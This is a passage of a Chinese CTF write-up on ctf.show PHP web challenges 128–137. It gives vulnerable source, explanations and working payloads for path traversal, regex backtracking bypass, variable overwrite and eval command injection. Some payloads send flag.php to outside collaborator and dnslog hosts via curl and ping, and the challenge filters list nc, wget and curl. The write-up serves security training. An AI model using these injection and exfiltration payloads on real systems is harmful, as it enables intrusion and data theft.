variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">关于php中gettext的用法？</a></p><p>小知识点： _()是一个函数</p><p><strong>_()&#x3D;&#x3D;gettext()</strong> 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p><p>**get_defined_vars()**函数</p><p>get_defined_vars —&gt;返回由所有已定义变量所组成的数组 这样可以获得 $flag</p><p>Payload: <code>?f1=_&amp;f2=get_defined_vars</code></p><h4 id="web129-stripos-目录穿越"><a href="#web129-stripos-目录穿越" class="headerlink" title="web129(stripos  目录穿越)"></a>web129(stripos  目录穿越)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。如果没有找到字符串则返回 FALSE。</p><p><strong>注释：</strong>stripos() 函数是不区分大小写的。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p>目录穿越</p><p>Payload:</p><blockquote><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;flag.php</p><p>?f&#x3D;.&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </p></blockquote><h4 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>1）第一个判断。<br>.+?表示匹配任意字符一个或则多个。<br>.*? 表示匹配任意字符0个或多个。</p><p>. 匹配除换行符 \n 之外的任何单字符。</p><ul><li>匹配前面的子表达式一次或多次。<br>? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。<br>&#x2F;i不区分大小写<br>&#x2F;s 匹配任何空白字符，包括空格、制表符、换页符等等。<br>题中整个正则表达式的意思就是，以任意一个或多个字符开头，遇到ctfshow就匹配，不区分大小写，不能有任何空白字符。</li></ul><p>也就是说输入的内容里，ctfshow前面不能有字符。</p><p>2）第二个判断。stripos函数如果未发现字符串将返回 FALSE。<br>全等于的条件是必须双方的类型也一样，所以ctfshow在首位返回的0与FLASE不全等。</p><p>所以payload:<code>POST:f=ctfshow</code></p><h4 id="web131-正则最大回溯"><a href="#web131-正则最大回溯" class="headerlink" title="web131(正则最大回溯)"></a>web131(正则最大回溯)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><a href="https://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯&#x2F;递归限制</a></p><p>在php中正则表达式进行匹配有一定的限制，超过限制直接返回false</p><p>Poc</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment"># Construct the payload</span>preg <span class="token operator">=</span> <span class="token string">'very'</span> <span class="token operator">*</span> <span class="token number">250000</span> <span class="token operator">+</span> <span class="token string">'36Dctfshow'</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'f'</span><span class="token punctuation">:</span> preg<span class="token punctuation">&#125;</span><span class="token comment"># The target URL</span>url <span class="token operator">=</span> <span class="token string">'https://b8e115f7-c0eb-4c76-9dd8-840b15166fb3.challenge.ctf.show/'</span><span class="token comment"># Send the POST request</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token comment"># Check for errors and print the response</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Response:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed to get a valid response. Status code:'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="web132-PHP逻辑运算符绕过"><a href="#web132-PHP逻辑运算符绕过" class="headerlink" title="web132(PHP逻辑运算符绕过)"></a>web132(PHP逻辑运算符绕过)</h4><p>访问<code>robots.txt</code>–&gt;<code>/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://www.cnblogs.com/hurry-up/p/10220082.html">PHP中逻辑运算符的高效用法—&amp;&amp;和||</a></p><p>对于“与”（**&amp;&amp;<strong>） 运算： <strong>x &amp;&amp; y</strong> 当</strong>x<strong>为</strong>false<strong>时，直接跳过，不执行</strong>y<strong>；<br>对于“或”（</strong>||<strong>） 运算 ：  <strong>x||y</strong> 当</strong>x<strong>为</strong>true<strong>时，直接跳过，不执行</strong>y**。</p><p>所以payload：<code>?code=admin&amp;password=1&amp;username=admin</code></p><h4 id="web133-substr绕过-DNSlog-Collaborator-Client"><a href="#web133-substr绕过-DNSlog-Collaborator-Client" class="headerlink" title="web133(substr绕过 DNSlog Collaborator Client)"></a>web133(substr绕过 DNSlog Collaborator Client)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6个字母都还不够呀?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></span></code></pre><p>我们传递?F&#x3D;<code>$F</code>;+sleep 3好像网站确实sleep了一会说明的确执行了命令<br>那为什么会这样？<br>因为是我们传递的<code>$F</code>;+sleep 3。先进行substr()函数截断然后去执行eval()函数<br>这个函数的作用是执行php代码，是shell_exec()函数的缩写，然后就去命令执行。<br>而$F就是我们输入的<code>$F</code>;+sleep 3 使用最后执行的代码应该是<br><code>$F</code>;+sleep 3,就执行成功<br>这里可能有点绕，慢慢理解</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//?F=`$F`; sleep 3</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// `$F`; </span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// eval("`$F`; "); -> eval("``$F`; sleep 3`; "); "`" 只会被展开一次</span></code></pre><blockquote><p>利用<code>$F</code>;让eval执行shell语句。<br>这一串字符长度是5，加个空格，满足substr的6个字符截取，让eval执行<code>$F</code>;</p><p>如传递<code>$F</code>;+sleep 3，页面会sleep一会。具体执行过程如下：<br>&#x3D;&#x3D;&gt;php:   eval(substr($F,0,6));<br>&#x3D;&#x3D;&gt;php:   eval(“<code>$F</code>; “);<br>&#x3D;&#x3D;&gt;php:   eval(“&#96;&#96;$F<code>; sleep 3</code>; “);<br>&#x3D;&#x3D;&gt;shell: <code>$F</code>; sleep 3<br>所以就执行了sleep 3</p></blockquote><p>方法一(DNSlog外带)：（没成功）</p><p><a href="http://www.dnslog.cn/">在线DNSlog</a></p><p>先得到一个域名，然后利用dnslog实现命令回显。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://haha.0iix2r.dnslog.cn/<span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span><span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.0iix2r.dnslog.cn</code></pre><p>Payload:</p><p>当ping一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就能说明漏洞确实存在。</p><p>flag.php是多行，需要grep一下，其次不能含有特殊符号，所以tr设置一下返回结果只携带字母和数字。</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php <span class="token operator">|</span> <span class="token function">grep</span> ctfshow <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.3aqybg.dnslog.cn <span class="token parameter variable">-c</span> <span class="token number">1</span></code></pre><p>方法二( Collaborator Client Curl -F):</p><p>使用curl -F命令。-F 为带文件的形式发送post请求。</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+curl <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://smiegnphdyy8keqa8wcuo4ypfgl790xp.oastify.com</code></pre><p><img src="web133.png" loading="lazy"></p><h4 id="web134-变量覆盖"><a href="#web134-变量覆盖" class="headerlink" title="web134(变量覆盖)"></a>web134(变量覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>看到parse_str和extract。变量覆盖<br>第一条if判断，要求key1和key2不能通过get和post传递。</p><p>parse_str是对get请求进行的内容解析成变量。例如传递?a&#x3D;1，执行后就是$a&#x3D;1。<br>那么相对的，传递<code>_POST</code>，就是对<code>$_POST</code>进行赋值，正好就可以绕过if条件对post的限制。<br>extract() 函数从数组中将变量导入到当前的符号表。</p><p>payload：<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"师傅们居然破解了前面的，那就来一个加强版吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>限制了许多命令，ping可以用，读取命令<code>nl</code>可以用。<br>grep被限制了，可以用awk指定行号输出，不过需要逐行测试，在15行有flag。或者参考之前flag的格式，也可以推测出来是15。</p><p>这个题还把flag分成了两个，行号15和16，需要拼接一下。</p><p>Payload:</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span><span class="token punctuation">;</span>+ping <span class="token variable"><span class="token variable">`</span><span class="token function">nl</span> flag.php<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'NR==15'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">'[a-z]'</span>/<span class="token string">'[0-9]'</span><span class="token variable">`</span></span>.i1k4phddlneygl58oqbjxv93full9a.oastify.com</code></pre><p>发现新解法：</p><pre class="language-bash" data-language="bash"><code class="language-bash">?F<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$F<span class="token variable">`</span></span>+<span class="token punctuation">;</span>cp+flag.php+1.txt</code></pre><h4 id="web136-tee"><a href="#web136-tee" class="headerlink" title="web136(tee)"></a>web136(tee)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p><code>tee</code>用于显示程序的输出并将其复制到一个文件中。</p><p>Payload:</p><blockquote><p>?c&#x3D;ls &#x2F;|tee 1</p><p>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 1</p></blockquote><h4 id="web137-call-user-func"><a href="#web137-call-user-func" class="headerlink" title="web137(call_user_func)"></a>web137(call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token 